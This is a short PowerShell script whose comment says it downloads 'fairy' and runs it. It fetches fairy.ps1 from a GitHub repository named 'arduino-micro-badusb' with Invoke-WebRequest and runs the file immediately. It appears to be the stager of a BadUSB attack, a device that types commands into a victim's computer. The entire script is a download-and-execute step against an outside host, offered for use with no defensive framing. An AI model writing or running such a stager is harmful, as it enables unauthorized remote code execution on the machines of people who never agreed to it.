# this script will download the latest version of fairy and run it
Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/fairy.ps1 -OutFile fairy.ps1
./fairy.ps1